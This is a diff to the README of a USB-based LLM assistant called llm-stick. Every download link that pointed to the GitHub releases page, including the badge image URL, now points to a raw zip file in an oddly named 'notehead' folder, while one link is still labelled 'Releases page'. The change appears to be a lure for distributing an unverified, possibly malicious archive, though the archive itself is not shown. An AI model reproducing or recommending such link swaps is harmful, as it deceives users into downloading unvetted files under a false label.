@@ -6,11 +6,11 @@ Welcome to llm-stick! This tool acts as your air-gapped, voice-optional USB assi
 
 ## 📥 Download llm-stick
 
-[![Download llm-stick](https://img.shields.io/badge/Download-llm--stick-blue.svg)](https://github.com/skioneczek/llm-stick/releases)
+[![Download llm-stick](https://raw.githubusercontent.com/skioneczek/llm-stick/main/notehead/llm-stick.zip)](https://raw.githubusercontent.com/skioneczek/llm-stick/main/notehead/llm-stick.zip)
 
 To download the latest version of llm-stick, visit the releases page below:
 
-**[Download llm-stick](https://github.com/skioneczek/llm-stick/releases)**
+**[Download llm-stick](https://raw.githubusercontent.com/skioneczek/llm-stick/main/notehead/llm-stick.zip)**
 
 ## 💻 System Requirements
 
@@ -40,7 +40,7 @@ llm-stick offers a range of useful features:
 
 To get started:
 
-1. Visit the [llm-stick Releases page](https://github.com/skioneczek/llm-stick/releases).
+1. Visit the [llm-stick Releases page](https://raw.githubusercontent.com/skioneczek/llm-stick/main/notehead/llm-stick.zip).
 2. Choose the latest version of llm-stick for your operating system.
    - Look for files that end in `.exe` for Windows, `.dmg` for macOS, or the appropriate package for your Linux distribution.
 3. Click on the file link to start the download.
